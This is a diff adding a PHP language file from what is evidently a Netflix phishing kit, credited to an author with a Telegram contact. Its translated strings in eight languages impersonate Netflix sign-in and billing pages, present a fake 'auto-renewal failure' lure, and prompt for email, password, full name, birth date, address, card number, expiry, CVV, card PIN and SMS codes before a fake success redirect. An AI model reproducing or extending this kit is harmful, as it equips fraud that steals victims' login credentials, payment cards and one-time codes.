@@ -1,0 +1,651 @@
+<?php
+    /*******
+    Main Author: Alexscampages
+    Contact me on telegram : https://t.me/Alfabrabus
+    ********************************************************/
+
+    $lang = array(
+
+        'signin' => array(
+            'en' => 'Sign In',
+            'fr' => 'S\'identifier',
+            'es' => 'Iniciar sesión',
+            'ar' => 'تسجيل الدخول',
+            'pt' => 'Entrar',
+            'de' => 'Anmelden',
+            'jp' => 'ログイン',
+			'nl' => 'Aanmelden',
+        ),
+
+        'email_placeholder' => array(
+            'en' => 'Email or phone number',
+            'fr' => 'E-mail ou numéro de téléphone',
+            'es' => 'Correo electrónico o número de teléfono',
+            'ar' => 'البريد الإلكتروني أو رقم الهاتف',
+            'pt' => 'E-mail ou número de telefone',
+            'de' => 'E-Mail oder Telefonnummer',
+            'jp' => 'メールアドレスまたは電話番号',
+			'nl' => 'E-mail of telefoonnummer',
+        ),
+
+        'email_error' => array(
+            'en' => 'Please enter a valid email or phone number.',
+            'fr' => 'Veuillez saisir un e-mail ou un numéro de téléphone valide.',
+            'es' => 'Ingrese un correo electrónico o número de teléfono válido.',
+            'ar' => 'يرجى إدخال عنوان بريد إلكتروني صالح أو رقم هاتف صالح.',
+            'pt' => 'Por favor, insira um e-mail ou número de telefone válido.',
+            'de' => 'Bitte geben Sie eine gültige E-Mail oder Telefonnummer ein.',
+            'jp' => '有効な電子メールまたは電話番号を入力してください。',
+			'nl' => 'Voer een geldig e-mailadres of telefoonnummer in.',
+        ),
+
+        'password_placeholder' => array(
+            'en' => 'Password',
+            'fr' => 'Mot de passe',
+            'es' => 'Clave',
+            'ar' => 'كلمة مرور',
+            'pt' => 'Senha',
+            'de' => 'Passwort',
+            'jp' => 'パスワード',
+			'nl' => 'Wachtwoord',
+        ),
+
+        'password_error' => array(
+            'en' => 'Your password must contain between 4 and 60 characters.',
+            'fr' => 'Votre mot de passe doit contenir entre 4 et 60 caractères.',
+            'es' => 'Su contraseña debe contener entre 4 y 60 caracteres.',
+            'ar' => 'يجب أن تتضمن كلمة المرور ما بين 4 إلى 60 حرفًا.',
+            'pt' => 'Sua senha deve conter entre 4 e 60 caracteres.',
+            'de' => 'Ihr Passwort muss zwischen 4 und 60 Zeichen enthalten.',
+            'jp' => 'パスワードには 4 ～ 60 文字を含める必要があります。',
+			'nl' => 'Uw wachtwoord moet tussen de 4 en 60 tekens bevatten.',
+        ),
+
+        'remember' => array(
+            'en' => 'Remember me',
+            'fr' => 'Souviens-toi de moi',
+            'es' => 'Recuérdame',
+            'ar' => 'تذكرني',
+            'pt' => 'Lembre de mim',
+            'de' => 'Mich erinnern',
+            'jp' => '私を覚えてますか',
+			'nl' => 'Onthoud me',
+        ),
+
+        'need_help' => array(
+            'en' => 'Need help?',
+            'fr' => 'Besoin d\'aide?',
+            'es' => '¿Necesitas ayuda?',
+            'ar' => 'تحتاج للمساعدة؟',
+            'pt' => 'Preciso de ajuda?',
+            'de' => 'Brauchen Sie Hilfe?',
+            'jp' => '助けが必要？',
+			'nl' => 'Hulp nodig?',
+        ),
+
+        'login_facebook' => array(
+            'en' => 'Login with Facebook',
+            'fr' => 'Se connecter avec Facebook',
+            'es' => 'Iniciar sesión con Facebook',
+            'ar' => 'تسجيل الدخول باستخدام Facebook',
+            'pt' => 'Entrar com o Facebook',
+            'de' => 'Mit Facebook einloggen',
+            'jp' => 'Facebookでログイン',
+			'nl' => 'Inloggen met Facebook',
+        ),
+
+        'signup' => array(
+            'en' => 'New to Netflix? <span style="color: #FFF;">Sign up now</span>',
+            'fr' => 'Nouveau sur Netflix? <span style="color: #FFF;">S\'inscrire maintenant</span>',
+            'es' => '¿Nuevo en Netflix? <span style="color: #FFF;">Regístrate ahora</span>',
+            'ar' => 'جديد على Netflix؟ <span style="color: #FFF;">التسجيل الآن.</span>',
+            'pt' => 'Novo no Netflix? <span style="color: #FFF;">Inscreva-se agora</span>',
+            'de' => 'Neu bei Netflix? <span style="color: #FFF;">Jetzt anmelden</span>',
+            'jp' => 'Netflix を初めてご利用ですか? <span style="color: #FFF;">今すぐ登録</span>',
+			'nl' => 'Nieuw bij Netflix? <span style="color: #FFF;">Meld je nu aan</span>',
+        ),
+
+        'login_text' => array(
+            'en' => 'This page is protected by Google reCAPTCHA to ensure you\'re not a bot. <span style="color: #0071eb;">Learn more</span>',
+            'fr' => 'Cette page est protégée par Google reCAPTCHA pour garantir que vous n\'êtes pas un bot. <span style="color: #0071eb;">Apprendre encore plus</span>',
+            'es' => 'Esta página está protegida por Google reCAPTCHA para garantizar que no sea un bot. <span style="color
+            : #0071eb;">Aprende más</span>',
+            'ar' => 'هذه الصفحة محمية بواسطة خدمة reCAPTCHA من Google لضمان أنك لست إنسانًا آليًا. <span style="color: #0071eb;">تعرّف على المزيد.</span>',
+            'pt' => 'Esta página é protegida pelo Google reCAPTCHA para garantir que você não seja um bot. <span style="color: #0071eb;">Saiba mais</span>',
+            'de' => 'Diese Seite ist durch Google reCAPTCHA geschützt, um sicherzustellen, dass Sie kein Bot sind. <span style="color: #0071eb;">Weitere Informationen</span>',
+            'jp' => 'このページは、ボットではないことを保証するために Google reCAPTCHA によって保護されています。 <span style="color: #0071eb;">詳細</span>',
+			'nl' => 'Deze pagina wordt beschermd door Google reCAPTCHA om er zeker van te zijn dat u geen bot bent. <span style="color: #0071eb;">Meer informatie</span>',
+        ),
+
+        'questions' => array(
+            'en' => 'Questions? Contact us.',
+            'fr' => 'Des questions? Contactez-nous.',
+            'es' => '¿Preguntas? Contáctenos.',
+            'ar' => 'هل لديك أسئلة؟ اتصل بنا.',
+            'pt' => 'Questões? Contate-nos.',
+            'de' => 'Fragen? Kontaktiere uns.',
+            'jp' => '質問がありますか? お問い合わせ。',
+			'nl' => 'Vragen? Neem contact met ons op.',
+        ),
+
+        'faq' => array(
+            'en' => 'FAQ',
+            'fr' => 'FAQ',
+            'es' => 'preguntas frecuentes',
+            'ar' => 'الأسئلة الشائعة',
+            'pt' => 'Perguntas frequentes',
+            'de' => 'FAQ',
+            'jp' => 'よくある質問',
+			'nl' => 'FAQ',
+        ),
+
+        'cookies' => array(
+            'en' => 'Cookie Preferences',
+            'fr' => 'Préférences relatives aux cookies',
+            'es' => 'Preferencias de cookies',
+            'ar' => 'تفضيلات الكوكيز',
+            'pt' => 'Preferências de Cookies',
+            'de' => 'Cookie-Einstellungen',
+            'jp' => 'クッキーの設定',
+			'nl' => 'Cookievoorkeuren',
+        ),
+
+        'help' => array(
+            'en' => 'Help Center',
+            'fr' => 'Centre d\'aide',
+            'es' => 'Centro de ayuda',
+            'ar' => 'مركز خدمة العملاء',
+            'pt' => 'Centro de ajuda',
+            'de' => 'Hilfezentrum',
+            'jp' => 'ヘルプセンター',
+			'nl' => 'Helpcentrum',
+        ),
+
+        'corporate' => array(
+            'en' => 'Corporate Information',
+            'fr' => 'Information d\'entreprise',
+            'es' => 'Información corporativa',
+            'ar' => 'معلومات الشركة',
+            'pt' => 'Informação corporativa',
+            'de' => 'Unternehmensinformationen',
+            'jp' => '企業情報',
+			'nl' => 'Bedrijfsinformatie',
+        ),
+
+        'terms' => array(
+            'en' => 'Terms of Use',
+            'fr' => 'Conditions d\'utilisation',
+            'es' => 'Condiciones de uso',
+            'ar' => 'بنود الاستخدام',
+            'pt' => 'Termos de uso',
+            'de' => 'Nutzungsbedingungen',
+            'jp' => '利用規約',
+			'nl' => 'Gebruiksvoorwaarden',
+        ),
+
+        'privacy' => array(
+            'en' => 'Privacy',
+            'fr' => 'Vie privée',
+            'es' => 'Intimidad',
+            'ar' => 'الخصوصية',
+            'pt' => 'Privacidade',
+            'de' => 'Privatsphäre',
+            'jp' => 'プライバシー',
+			'nl' => 'Privacy',
+        ),
+
+        'step1' => array(
+            'en' => 'STEP 1 OF 1',
+            'fr' => 'ÉTAPE 1 SUR 1',
+            'es' => 'PASO 1 DE 1',
+            'ar' => 'الخطوة 1 من 1',
+            'pt' => 'PASSO 1 DE 1',
+            'de' => 'SCHRITT 1 VON 1',
+            'jp' => 'ステップ 1/1',
+			'nl' => 'STAP 1 VAN 1',
+        ),
+
+        'details_title' => array(
+            'en' => 'Set up your personal information.',
+            'fr' => 'Configurez vos informations personnelles',
+            'es' => 'Configura tu información personal',
+            'ar' => 'قم بإعداد معلوماتك الشخصية',
+            'pt' => 'Configure suas informações pessoais',
+            'de' => 'Richten Sie Ihre persönlichen Daten ein',
+            'jp' => '個人情報を設定します。',
+			'nl' => 'Stel uw persoonlijke gegevens in.',
+        ),
+
+        'cc_title' => array(
+            'en' => 'Set up your credit or debit card.',
+            'fr' => 'Configurez votre carte de crédit ou de débit.',
+            'es' => 'Configura tu tarjeta de crédito o débito.',
+            'ar' => 'قم بإعداد بطاقة الائتمان  الخاصة بك.',
+            'pt' => 'Configure seu cartão de crédito ou débito.',
+            'de' => 'Richten Sie Ihre Kredit- oder Debitkarte ein.',
+            'jp' => 'クレジット カードまたはデビット カードを設定します。',
+			'nl' => 'Stel uw creditcard of betaalpas in.',
+        ),
+
+        'full_name_placeholder' => array(
+            'en' => 'Full name',
+            'fr' => 'Nom et prénom',
+            'es' => 'Nombre completo',
+            'ar' => 'الاسم الكامل',
+            'pt' => 'Nome completo',
+            'de' => 'Vollständiger Name',
+            'jp' => 'フルネーム',
+			'nl' => 'Voor-en achternaam',
+        ),
+
+        'full_name_error' => array(
+            'en' => 'Please enter a valid name',
+            'fr' => 'Merci d\'entrer un nom valide',
+            'es' => 'Por favor ingrese un nombre valido',
+            'ar' => 'الاسم الكامل غير صالح',
+            'pt' => 'Por favor, indique um nome válido',
+            'de' => 'Bitte geben Sie einen gültigen Namen ein',
+            'jp' => '有効な名前を入力してください',
+			'nl' => 'Vul alstublieft een geldige naam in',
+        ),
+
+        'birth_date_placeholder' => array(
+            'en' => 'Birth date (DD/MM/YYYY)',
+            'fr' => 'Date de naissance (JJ/MM/AAAA)',
+            'es' => 'Fecha de nacimiento (DD/MM/AAAA)',
+            'ar' => 'تاريخ الميلاد (اليوم / الشهر / السنة)',
+            'pt' => 'Data de nascimento (DD/MM/AAAA)',
+            'de' => 'Geburtsdatum (TT/MM/JJJJ)',
+            'jp' => '生年月日 (DD/MM/YYYY)',
+			'nl' => 'Geboortedatum (DD/MM/JJJJ)',
+        ),
+
+        'birth_date_error' => array(
+            'en' => 'Please enter a valid date',
+            'fr' => 'veuillez entrer une date valide',
+            'es' => 'Por favor introduzca una fecha valida',
+            'ar' => 'التاريخ غير صالح',
+            'pt' => 'Por favor insira uma data válida',
+            'de' => 'Bitte gib ein korrektes Datum an',
+            'jp' => '有効な日付を入力してください',
+			'nl' => 'Gelieve een correcte datum in te voeren',
+        ),
+
+        'address_placeholder' => array(
+            'en' => 'Address',
+            'fr' => 'Adresse',
+            'es' => 'Dirección',
+            'ar' => 'العنوان',
+            'pt' => 'Endereço',
+            'de' => 'Adresse',
+            'jp' => '住所',
+			'nl' => 'Adres',
+        ),
+
+        'address_error' => array(
+            'en' => 'Please enter a valid address',
+            'fr' => 's\'il-vous-plaît entrez une adresse valide',
+            'es' => 'Por favor introduce una dirección válida',
+            'ar' => 'العنوان غير صحيح',
+            'pt' => 'Por Favor insira um endereço válido',
+            'de' => 'Bitte geben Sie eine gültige Adresse ein',
+            'jp' => '有効な住所を入力してください',
+			'nl' => 'Vul alstublieft een geldig adres in',
+        ),
+
+        'phone_placeholder' => array(
+            'en' => 'Phone number',
+            'fr' => 'Numéro de téléphone',
+            'es' => 'Número de teléfono',
+            'ar' => 'رقم الهاتف',
+            'pt' => 'Número de telefone',
+            'de' => 'Telefonnummer',
+            'jp' => '電話番号',
+			'nl' => 'Telefoonnummer',
+        ),
+
+        'phone_error' => array(
+            'en' => 'Please enter a valid phone number',
+            'fr' => 's\'il vous plaît entrer un numéro de téléphone valide',
+            'es' => 'Por favor ingrese un número de teléfono válido',
+            'ar' => 'رقم الهاتف غير صالح',
+            'pt' => 'Por favor insira um número de telefone válido',
+            'de' => 'Bitte geben Sie eine gültige Telefonnummer ein',
+            'jp' => '有効な電話番号を入力して下さい',
+			'nl' => 'Voer alstublieft een geldig telefoonnummer in',
+        ),
+
+        'city_placeholder' => array(
+            'en' => 'City',
+            'fr' => 'Ville',
+            'es' => 'Ciudad',
+            'ar' => 'المدينة',
+            'pt' => 'Cidade',
+            'de' => 'Stadt',
+            'jp' => '街',
+			'nl' => 'Stad',
+        ),
+
+        'city_error' => array(
+            'en' => 'Please enter a valid city',
+            'fr' => 'La ville n\'est pas valide',
+            'es' => 'La ciudad no es válida',
+            'ar' => 'إسم المدينة غير صحيح',
+            'pt' => 'Insira uma cidade válida',
+            'de' => 'Bitte geben sie eine gültige Stadt ein',
+            'jp' => '有効な都市を入力してください',
+			'nl' => 'Voer een geldige stad in',
+        ),
+
+        'zip_placeholder' => array(
+            'en' => 'Postal code',
+            'fr' => 'Code postal',
+            'es' => 'Código postal',
+            'ar' => 'الرمز البريدي',
+            'pt' => 'Código postal',
+            'de' => 'Postleitzahl',
+            'jp' => '郵便番号',
+			'nl' => 'Postcode',
+        ),
+
+        'zip_error' => array(
+            'en' => 'Please enter a valid postal code',
+            'fr' => 'Veuillez entrer un code postal valide',
+            'es' => 'Por favor ingrese un código postal válido',
+            'ar' => 'الرمز البريدي غير صالح',
+            'pt' => 'Insira um código postal válido',
+            'de' => 'Bitte geben Sie eine gültige Postleitzahl ein',
+            'jp' => '有効な郵便番号を入力してください',
+			'nl' => 'Voer een geldige postcode in',
+        ),
+
+        'one_placeholder' => array(
+            'en' => 'Card Number',
+            'fr' => 'Numéro de carte',
+            'es' => 'Número de tarjeta',
+            'ar' => 'رقم البطاقة',
+            'pt' => 'Número do cartão',
+            'de' => 'Kartennummer',
+            'jp' => 'カード番号',
+			'nl' => 'Kaartnummer',
+        ),
+
+        'one_error' => array(
+            'en' => 'Please enter a valid card number',
+            'fr' => 'S\'il vous plaît entrez un numéro de carte valide',
+            'es' => 'Por favor, introduzca un número de tarjeta válido',
+            'ar' => 'رقم البطاقة غير صالح',
+            'pt' => 'Por favor, insira um número de cartão válido',
+            'de' => 'Bitte geben Sie eine gültige Kartennummer ein',
+            'jp' => '有効なカード番号を入力してください',
+			'nl' => 'Gelieve een geldig kaart nummer in te voeren',
+        ),
+
+        'two_placeholder' => array(
+            'en' => 'Expiration Date (MM/YY)',
+            'fr' => 'Date d\'expiration (MM/AA)',
+            'es' => 'Fecha de caducidad (MM/AA)',
+            'ar' => 'تاريخ انتهاء الصلاحية (شهر / سنة)',
+            'pt' => 'Data de vencimento (MM/AA)',
+            'de' => 'Ablaufdatum (MM/JJ)',
+            'jp' => '有効期限 (MM/YY)',
+			'nl' => 'Vervaldatum (MM/JJ)',
+        ),
+
+        'two_error' => array(
+            'en' => 'Please enter a valid date',
+            'fr' => 'Veuillez entrer une date valide',
+            'es' => 'Por favor introduzca una fecha valida',
+            'ar' => 'التاريخ غير صحيح',
+            'pt' => 'Por favor insira uma data válida',
+            'de' => 'Bitte gib ein korrektes Datum an',
+            'jp' => '有効な日付を入力してください',
+			'nl' => 'Gelieve een correcte datum in te voeren',
+        ),
+
+        'three_placeholder' => array(
+            'en' => 'Security Code (CVV)',
+            'fr' => 'Code de sécurité (CVV)',
+            'es' => 'Código de seguridad (CVV)',
+            'ar' => 'كود الحماية (CVV)',
+            'pt' => 'Código de Segurança (CVV)',
+            'de' => 'Sicherheitscode (CVV)',
+            'jp' => 'セキュリティコード (CVV)',
+			'nl' => 'Beveiligingscode (CVV)',
+        ),
+
+        'three_error' => array(
+            'en' => 'Please enter a valid security code',
+            'fr' => 'Veuillez entrer un code de sécurité valide',
+            'es' => 'Por favor ingrese un código de seguridad válido',
+            'ar' => 'كود الحماية غير صالح',
+            'pt' => 'Insira um código de segurança válido',
+            'de' => 'Bitte geben Sie einen gültigen Sicherheitscode ein',
+            'jp' => '有効なセキュリティコードを入力してください',
+			'nl' => 'Voer een geldige beveiligingscode in',
+        ),
+
+        'four_placeholder' => array(
+            'en' => 'Card PIN',
+            'fr' => 'code PIN',
+            'es' => 'PIN de la tarjeta',
+            'ar' => 'رقم التعريف الشخصي للبطاقة',
+            'pt' => 'PIN do cartão',
+            'de' => 'Karten-PIN',
+            'jp' => 'カード暗証番号',
+			'nl' => 'Pincode van de kaart',
+        ),
+
+        'four_error' => array(
+            'en' => 'Please enter a valid pin',
+            'fr' => 'Veuillez saisir un code PIN valide',
+            'es' => 'Introduce un pin válido',
+            'ar' => 'الرجاء إدخال رقم تعريف شخصي صالح',
+            'pt' => 'Insira um PIN válido',
+            'de' => 'Bitte geben Sie eine gültige PIN ein',
+            'jp' => '有効なPINを入力してください',
+			'nl' => 'Voer een geldige pincode in',
+        ),
+
+        'cc_text' => array(
+            'en' => 'By checking the checkbox below, you agree to our <span>Terms of Use,</span> <span>Privacy Statement,</span> and that you are over 18. Netflix will automatically continue your membership and charge the monthly membership fee to your payment method until you cancel. You may cancel at any time to avoid future charges.',
+            'fr' => 'En cochant la case ci-dessous, vous acceptez nos <span>Conditions d\'utilisation,</span> <span>Déclaration de confidentialité</span> et que vous avez plus de 18ans. Netflix maintiendra automatiquement votre abonnement et facturera les frais d\'abonnement mensuels à votre mode de paiement jusqu\'à ce que vous annuliez. Vous pouvez annuler à tout moment pour éviter des frais futurs.',
+            'es' => 'Al marcar la casilla de verificación a continuación, acepta nuestros <span>Términos de uso,</span> <span>Declaración de privacidad</span> y que tiene más de 18 años. Netflix continuará automáticamente con su membresía y le cobrará la tarifa mensual de membresía a su método de pago hasta que cancele. Puede cancelar en cualquier momento para evitar cargos futuros.',
+            'ar' => 'من خلال تحديد مربع الاختيار أدناه ، فإنك توافق على شروط الاستخدام ، * بيان الخصوصية الخاص بنا ، وأن عمرك يتجاوز 18 عامًا. ستواصل Netflix تلقائيًا عضويتك وتحمل رسوم العضوية الشهرية على طريقة الدفع الخاصة بك حتى تقوم بالإلغاء. يمكنك الإلغاء في أي وقت لتجنب الرسوم المستقبلية.',
+            'pt' => 'Ao marcar a caixa de seleção abaixo, você concorda com nossos <span>Termos de uso</span> <span>Declaração de privacidade</span> e que é maior de 18 anos. A Netflix continuará automaticamente com sua assinatura e cobrará a taxa mensal de assinatura para o seu método de pagamento até que você cancele. Você pode cancelar a qualquer momento para evitar cobranças futuras.',
+            'de' => 'Indem Sie das Kontrollkästchen unten aktivieren, stimmen Sie unseren <span>Nutzungsbedingungen,</span> <span>Datenschutzerklärung</span> zu und erklären sich damit einverstanden, dass Sie über 18 Jahre alt sind. Netflix setzt Ihre Mitgliedschaft automatisch fort und berechnet die monatliche Mitgliedsgebühr zu Ihrer Zahlungsmethode, bis Sie kündigen. Sie können jederzeit kündigen, um zukünftige Gebühren zu vermeiden.',
+            'jp' => '下のチェックボックスをオンにすると、<span>利用規約</span>、<span>プライバシーに関する声明</span>、および 18 歳以上であることに同意したものとみなされます。Netflix は自動的にメンバーシップを継続し、月額メンバーシップ料金を請求します。 キャンセルするまでお支払い方法を変更してください。 今後の料金を避けるために、いつでもキャンセルできます。',
+			'nl' => 'Door het onderstaande selectievakje aan te vinken, ga je akkoord met onze <span>Gebruiksvoorwaarden,</span> <span>Privacyverklaring</span> en ga je akkoord met het feit dat je ouder bent dan 18 jaar. Netflix zet je lidmaatschap automatisch voort en brengt de maandelijkse lidmaatschapskosten in rekening naar uw betaalmethode totdat u annuleert. U kunt op elk moment annuleren om toekomstige kosten te vermijden.',
+		),
+
+        'agree' => array(
+            'en' => 'I agree',
+            'fr' => 'Je suis d\'accord',
+            'es' => 'estoy de acuerdo',
+            'ar' => 'أنا موافق',
+            'pt' => 'Concordo',
+            'de' => 'Ich stimme zu',
+            'jp' => '同意します',
+			'nl' => 'Ik ben het eens',
+        ),
+
+        'submit' => array(
+            'en' => 'SUBMIT',
+            'fr' => 'CONFIRMER',
+            'es' => 'CONFIRMAR',
+            'ar' => 'متابعة',
+            'pt' => 'CONTINUAR',
+            'de' => 'WEITERMACHEN',
+            'jp' => '送信',
+			'nl' => 'INDIENEN',
+        ),
+
+        'loading' => array(
+            'en' => 'Checking your details...',
+            'fr' => 'Vérification de vos coordonnées...',
+            'es' => 'Comprobando tus datos...',
+            'ar' => 'جاري التحقق من التفاصيل الخاصة بك ...',
+            'pt' => 'Verificando seus dados...',
+            'de' => 'Überprüfung Ihrer Daten...',
+            'jp' => '詳細を確認しています...',
+			'nl' => 'Uw gegevens controleren...',
+        ),
+
+        'step2' => array(
+            'en' => 'STEP 3 OF 3',
+            'fr' => 'ÉTAPE 3 SUR 3',
+            'es' => 'PASO 3 DE 3',
+            'ar' => 'الخطوة 3 من 3',
+            'pt' => 'PASSO 3 DE 3',
+            'de' => 'SCHRITT 3 VON 3',
+            'jp' => 'ステップ 3/3',
+			'nl' => 'STAP 3 VAN 3',
+        ),
+
+        'sms_title' => array(
+            'en' => 'Let\'s verify it\'s you',
+            'fr' => 'Vérifions qu\'il s\'agit bien de vous',
+            'es' => 'Verifiquemos que eres tú',
+            'ar' => 'دعنا نتحقق من هويتك',
+            'pt' => 'Vamos verificar se é você',
+            'de' => 'Lassen Sie uns überprüfen, ob Sie es sind',
+            'jp' => 'あなたであることを確認しましょう',
+			'nl' => 'Laten we verifiëren dat u het bent',
+        ),
+
+        'sms_text' => array(
+            'en' => 'A security code will be sent to you by SMS or by call from a voice server to your phone number which will be valid for 5 minutes.',
+            'fr' => 'Un code de sécurité vous sera envoyé par SMS ou par appel depuis un serveur vocal vers votre numéro de téléphone qui sera valable 5 minutes.',
+            'es' => 'Se le enviará un código de seguridad por SMS o por llamada desde un servidor de voz a su número d
+            e teléfono que será válido durante 5 minutos.',
+            'ar' => 'سيتم إرسال رمز الحماية إليك عبر رسالة نصية قصيرة أو عن طريق الاتصال من خادم صوتي إلى رقم هاتفك والذي سيكون صالحًا لمدة 5 دقائق.',
+            'pt' => 'Um código de segurança será enviado a você por SMS ou por chamada de um servidor de voz para o seu número de telefone, válido por 5 minutos.',
+            'de' => 'Ein Sicherheitscode wird Ihnen per SMS oder Anruf von einem Sprachserver an Ihre Telefonnummer gesendet, der 5 Minuten lang gültig ist.',
+            'jp' => 'セキュリティ コードは、SMS または音声サーバーから電話番号への通話によって送信され、5 分間有効です。',
+			'nl' => 'Er wordt een beveiligingscode naar u verzonden via sms of een oproep van een voiceserver naar uw telefoonnummer, die 5 minuten geldig is.',
+        ),
+
+        'sms_placeholder' => array(
+            'en' => 'SMS code',
+            'fr' => 'SMS code',
+            'es' => 'código SMS',
+            'ar' => 'رمز الرسائل القصيرة',
+            'pt' => 'código SMS',
+            'de' => 'SMS-Code',
+            'jp' => 'SMSコード',
+			'nl' => 'SMS-code',
+        ),
+
+        'sms_error' => array(
+            'en' => 'Code is not valid',
+            'fr' => 'Le code n\'est pas valide',
+            'es' => 'El código no es válido',
+            'ar' => 'الرمز غير صالح',
+            'pt' => 'O código não é válido',
+            'de' => 'Code ist nicht gültig',
+            'jp' => 'コードが無効です',
+			'nl' => 'Code is niet geldig',
+        ),
+
+        'confirm' => array(
+            'en' => 'CONFIRM',
+            'fr' => 'CONFIRMER',
+            'es' => 'CONFIRMAR',
+            'ar' => 'تأكيد',
+            'pt' => 'CONFIRME',
+            'de' => 'BESTÄTIGEN',
+            'jp' => '確認',
+			'nl' => 'BEVESTIGEN',
+        ),
+
+        'signout' => array(
+            'en' => 'Sign Out',
+            'fr' => 'Se déconnecter',
+            'es' => 'Desconectar',
+            'ar' => 'خروج',
+            'pt' => 'Sair',
+            'de' => 'Austragen',
+            'jp' => 'サインアウト',
+			'nl' => 'Afmelden',
+        ),
+
+        'step3' => array(
+            'en' => 'STEP 4 OF 4',
+            'fr' => 'ÉTAPE 4 SUR 4',
+            'es' => 'PASO 4 DE 4',
+            'ar' => 'الخطوة 4 من 4',
+            'pt' => 'PASSO 4 DE 4',
+            'de' => 'SCHRITT 4 VON 4',
+            'jp' => 'ステップ 4/4',
+			'nl' => 'STAP 4 VAN 4',
+        ),
+
+        'success_title' => array(
+            'en' => 'Account Updated With Success',
+            'fr' => 'Compte mis à jour avec succès',
+            'es' => 'Cuenta actualizada con éxito',
+            'ar' => 'تم تحديث الحساب بنجاح',
+            'pt' => 'Conta atualizada com sucesso',
+            'de' => 'Konto erfolgreich aktualisiert',
+            'jp' => 'アカウントが正常に更新されました',
+			'nl' => 'Account bijgewerkt met succes',
+        ),
+
+        'success_text' => array(
+            'en' => 'You will redirected to our privacy after 5 seconds, please read the full topic.',
+            'fr' => 'Vous serez redirigé vers notre confidentialité après 5 secondes, veuillez lire le sujet complet.',
+            'es' => 'Será redirigido a nuestra privacidad después de 5 segundos, lea el tema completo.',
+            'ar' => 'ستتم إعادة توجيهك إلى خصوصيتنا بعد 5 ثوانٍ ، يرجى قراءة الموضوع كاملاً.',
+            'pt' => 'Você será redirecionado para nossa privacidade após 5 segundos, por favor, leia o tópico completo.',
+            'de' => 'Sie werden nach 5 Sekunden zu unserer Privatsphäre weitergeleitet, bitte lesen Sie das vollständige Thema.',
+            'jp' => '5 秒後にプライバシーにリダイレクトされます。トピック全文をお読みください。',
+			'nl' => 'U wordt na 5 seconden doorgestuurd naar onze privacy, lees het volledige onderwerp.',
+        ),
+
+        'redirect' => array(
+            'en' => 'REDIRECTION AFTER',
+            'fr' => 'REDIRECTION APRÈS',
+            'es' => 'REDIRECCIÓN DESPUÉS',
+            'ar' => 'إعادة التوجيه بعد',
+            'pt' => 'REDIRECIONAMENTO DEPOIS',
+            'de' => 'UMLENKUNG NACH',
+            'jp' => 'リダイレクト後の',
+			'nl' => 'OMLEIDING NA',
+        ),
+
+        'verify_title' => array(
+            'en' => 'Auto-renewal failure',
+            'fr' => 'Échec de renouvellement automatique',
+            'es' => 'Error de renovación automática',
+            'ar' => 'فشل التجديد التلقائي',
+            'pt' => 'Falha na renovação automática',
+            'de' => 'Fehler bei der automatischen Verlängerung',
+            'jp' => '自動更新の失敗',
+			'nl' => 'Automatische verlenging mislukt',
+        ),
+
+        'verify_text' => array(
+            'en' => 'Hello '. $_SESSION['username'] .', The last direct debit for your subscription failed.<br>This may be related to the payment method used to pay for your subscription.<br>Please re-enable direct debit so that you can continue to use our services.<br><br><span>Click the button below to resume your subscription and reactivate direct debit.</span>',
+            'fr' => 'Bonjour '. $_SESSION['username'] .', Le dernier prélèvement automatique de votre abonnement a échoué.<br>Cela peut être lié au moyen de paiment utilisé pour le paiment de votre abonnement.<br>Veuillez réactiver le prélèvement automatique afin de pouvoir continuer à utiliser nos services.<br><br><span>Cliquez sur le bouton ci-dessous afin de reprendre votre abonnement et réactiver le prélèvement automatique.</span>',
+            'es' => 'Buenos dias '. $_SESSION['username'] .', falló el último débito directo de su suscripción.<br>Esto puede estar relacionado con el método de pago utilizado para pagar su suscripción.<br>Vuelva a habilitar el débito directo para que pueda continúe usando nuestros servicios.<br><br><span>Haga clic en el botón a continuación para reanudar su suscripción y reactivar el débito directo.</span>',
+            'ar' => 'zzzzzzzzz',
+            'pt' => 'Olá '. $_SESSION['username'] .', O último débito direto para sua assinatura falhou.<br>Isso pode estar relacionado ao método de pagamento usado para pagar sua assinatura.<br>Reative o débito direto para que você possa continue a usar nossos serviços.<br><br><span>Clique no botão abaixo para retomar sua assinatura e reativar o débito direto.</span>',
+            'de' => 'Hallo '. $_SESSION['username'] .', Die letzte Lastschrift für Ihr Abonnement ist fehlgeschlagen.<br>Dies kann mit der Zahlungsmethode zusammenhängen, die zur Bezahlung Ihres Abonnements verwendet wurde.<br>Bitte aktivieren Sie die Lastschrift erneut, damit Sie dies tun können weiterhin unsere Dienste nutzen.<br><br><span>Klicken Sie auf die Schaltfläche unten, um Ihr Abonnement fortzusetzen und den Bankeinzug zu reaktivieren.</span>',
+            'jp' => 'こんにちは '. $_SESSION['username'] .'、サブスクリプションの最後の口座振替が失敗しました。<br>これは、サブスクリプションの支払いに使用された支払い方法に関連している可能性があります。<br>次のことをできるように、口座振替を再度有効にしてください。 引き続きサービスをご利用ください。<br><br><span>サブスクリプションを再開し、口座振替を再開するには、下のボタンをクリックしてください。</span>',
+			'nl' => 'Hallo '. $_SESSION['username'] .', De laatste automatische incasso voor uw abonnement is mislukt.<br>Dit kan te maken hebben met de betaalmethode die is gebruikt om voor uw abonnement te betalen.<br>Schakel automatische incasso opnieuw in zodat u onze services blijven gebruiken.<br><br><span>Klik op de onderstaande knop om uw abonnement te hervatten en automatische incasso opnieuw te activeren.</span>', 
+		),
+
+        'verify_button' => array(
+            'en' => 'Resume my subscription',
+            'fr' => 'Reprendre mon abonnement',
+            'es' => 'reanudar mi suscripción',
+            'ar' => 'استئناف اشتراكي',
+            'pt' => 'Retomar minha assinatura',
+            'de' => 'Setzen Sie mein Abonnement fort',
+            'jp' => 'サブスクリプションを再開する',
+			'nl' => 'Hervat mijn abonnement',
+        ),
+
+    );
+
+?>
